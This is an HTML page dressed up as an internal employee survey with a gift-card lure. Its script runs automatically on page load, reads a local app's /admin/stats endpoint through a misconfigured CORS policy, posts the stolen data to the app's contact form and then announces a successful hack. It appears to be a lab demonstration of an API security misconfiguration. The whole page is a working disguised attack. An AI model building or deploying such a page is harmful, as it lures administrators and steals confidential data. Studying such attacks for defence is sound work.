<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Employee Survey 2024</title>
<style>
body { 
font-family: 'Arial', sans-serif; 
background-color: #f4f7f6; 
display: flex; 
flex-direction: column; 
align-items: center; 
padding-top: 50px; 
        }
.container { 
background: white; 
padding: 40px; 
border-radius: 10px; 
box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
text-align: center; 
max-width: 500px; 
        }
h1 { color: #2ecc71; margin-bottom: 10px;}
p { color: #555; }
.btn { 
background-color: #2ecc71; 
color: white; 
padding: 15px 30px; 
text-decoration: none; 
border-radius: 5px; 
display: inline-block; 
margin-top: 20px; 
font-weight: bold; 
cursor: pointer;
        }
#console-output { 
margin-top: 30px; 
background: #2c3e50; 
color: #e74c3c; 
padding: 15px; 
border-radius: 5px; 
font-family: monospace; 
text-align: left;
display: none; 
word-wrap: break-word; 
        }
.port-info {
margin-top: 20px;
font-size: 12px;
color: #999;
        }
</style>
</head>
<body>
<div class="container">
<h1>ðŸ“‹ Internal Survey</h1>
<p>Help us improve office life!</p>
<p>Answer 3 questions and enter to win a gift card.</p>
<div class="btn">Start Survey</div>
<div id="console-output"></div>
<div class="port-info">Running on port: <span id="port-display">8000</span></div>
</div>
<script>
const PORT = '8000';
const BASE_URL = `http://127.0.0.1:${PORT}`;
const TARGET = `${BASE_URL}/admin/stats`;
const DROP_ZONE = `${BASE_URL}/contact`;

document.getElementById('port-display').textContent = PORT;

async function corsAttack() {
try {
console.log("Attempting to access " + TARGET + "...");
let response = await fetch(TARGET);
if (response.ok) {
let sensitiveData = await response.json();
let stolenString = JSON.stringify(sensitiveData, null, 2);
await fetch(DROP_ZONE, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
                        },
body: JSON.stringify({
email: "badguy@free.fr",
content: "Private stats: " + stolenString
                        })
                    });
let output = document.getElementById('console-output');
output.style.display = 'block';
output.innerHTML = 
"<strong>[HACK SUCCESSFUL]</strong><br>" +
"Confidential data has been stolen and sent via the contact form!<br><br>" +
"Check POSTMAN (GET /admin/messages) to see the loot.";
alert("API8 FAIL EXPLOITED!\n\nThe admin visited the page, the data has been stolen and sent to your 'Contact' inbox.");
                }
            } catch (err) {
console.log("Attack failed: " + err);
            }
        }
window.onload = corsAttack;
</script>
</body>
</html>